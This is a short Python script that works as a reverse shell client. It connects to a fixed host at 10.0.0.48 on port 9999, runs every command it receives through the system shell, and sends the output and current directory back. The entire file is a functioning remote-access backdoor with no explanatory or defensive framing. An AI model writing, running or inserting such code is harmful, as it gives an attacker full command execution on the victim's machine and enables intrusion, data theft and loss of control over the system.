#!/usr/bin/env python
import socket, os, subprocess

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "10.0.0.48"
port = 9999

# binding the host and port
sock.connect((host, port))

#infinite loop
while True:
    data = sock.recv(1024)

    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # send the command output back to the server
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        
        current_wd = os.getcwd() + "> "

        sock.send(str.encode(output_str + current_wd))

        # print the output on the target host
        print(output_str)